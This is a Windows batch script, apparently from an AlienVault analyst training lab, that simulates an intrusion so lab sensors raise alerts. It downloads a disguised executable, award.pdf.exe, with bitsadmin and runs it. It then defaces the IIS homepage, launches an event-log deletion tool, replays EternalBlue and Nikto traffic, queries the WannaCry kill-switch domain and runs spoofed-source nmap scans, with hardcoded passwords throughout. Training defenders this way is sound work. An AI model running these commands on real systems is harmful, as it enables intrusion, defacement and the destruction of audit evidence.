@echo off
REM joriordan@alienvault.com
set /p domain=Enter Domain: 
bitsadmin /transfer download_file /download /priority normal http://alien-training.com/award.pdf.exe C:\Users\Administrator\Downloads\award.pdf.exe > NUL
START C:\Users\Administrator\Downloads\award.pdf.exe
timeout /t 10
(echo ^<html^>
echo ^<\!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"^>
echo ^<html xmlns="http://www.w3.org/1999/xhtml"^>
echo ^<head^>
echo ^<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /^>
echo ^<title^>AlienVault Lab Test Homepage^</title^>
echo ^</head^>
echo ^<body^>
echo ^<img src="AV-Corporate-Logo.svg" alt="AlienVault" width="480" height="300" /^>^</a^>
echo ^<h1^> YOU HAVE BEEN BREACHED !! ^</h1^>
echo ^<br^>^<br^>^<br^>
echo ^<a href="/sub/blue.htm"^>Go to ^>^>^>^>^> BLUE^</a^>
echo ^<br^>
echo ^<a href="/sub/red.htm"^>Go to ^>^>^>^>^> RED^</a^>
echo ^<br^>
echo ^<a href="/sub/green.htm"^>Go to ^>^>^>^>^> GREEN^</a^>
echo ^</body^>
echo ^</html^> ) > C:\inetpub\wwwroot\index.htm
timeout /t 5
START C:\Users\Administrator\Desktop\scripts\Backup_Delete_Event_Log.exe
timeout /t 10
plink.exe root@192.168.250.13 -pw Password1! tcpreplay --topspeed -i eth0 scripts/DesktopSoftware.pcap
cls
timeout /t 20 /nobreak > NUL
plink.exe root@192.168.250.13 -pw Password1! tcpreplay --topspeed -i eth0 scripts/eternalblue.pcap
ipconfig /flushdns
nslookup iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
cls
timeout /t 20 /nobreak > NUL
plink.exe root@192.168.250.13 -pw Password1! tcpreplay --topspeed -i eth0 scripts/nikto2.pcap
plink.exe root@192.168.250.13 -pw Password1! nmap -e eth0 -Pn -S 46.4.123.15 192.168.250.17
plink.exe root@192.168.250.13 -pw Password1! nmap -e eth0 -Pn -S 46.4.123.15 192.168.250.17
cls
timeout /t 20 /nobreak > NUL
ipconfig /flushdns
nslookup blacklistthisdomain.com
cls
plink.exe root@192.168.250.13 -pw Password1! /root/scripts/resetScripts/analyst_lab4.py -d %domain% -u usm-anywhere-training@alienvault.com -p Password1!
pause